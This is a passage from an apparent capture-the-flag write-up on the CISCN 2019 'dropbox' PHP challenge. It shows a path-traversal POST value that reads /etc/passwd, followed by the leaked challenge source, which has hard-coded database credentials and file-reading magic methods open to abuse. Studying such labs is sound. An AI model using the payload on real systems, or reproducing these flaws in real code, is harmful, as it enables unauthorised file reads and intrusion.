<p>更改post内容:</p>
<pre><code>filename=../../../../../../etc/passwd</code></pre>
<p><img src="/2021/07/22/ciscn-2019-dropbox/image-20210723032155775.png" alt="image-20210723032155775"></p>
<p>搜索不到flag</p>
<h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<h5 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>
<span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>
<span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>
<span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">"dropbox"</span><span class="token punctuation">;</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token punctuation">.</span> <span class="token string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>
        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/th>'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>
        <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;tr>'</span><span class="token punctuation">;</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center">'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/td>'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;td class="text-center" filename="'</span> <span class="token punctuation">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'">&lt;a href="#" class="download">下载&lt;/a> / &lt;a href="#" class="delete">删除&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>
            <span class="token variable">$table</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'&lt;/tr>'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">' B'</span><span class="token punctuation">,</span> <span class="token string">' KB'</span><span class="token punctuation">,</span> <span class="token string">' MB'</span><span class="token punctuation">,</span> <span class="token string">' GB'</span><span class="token punctuation">,</span> <span class="token string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<h5 id="download-php"><a href="#download-php" class="headerlink" title="download.php"></a>download.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition: attachment; filename="</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"File not exist"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>delete.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
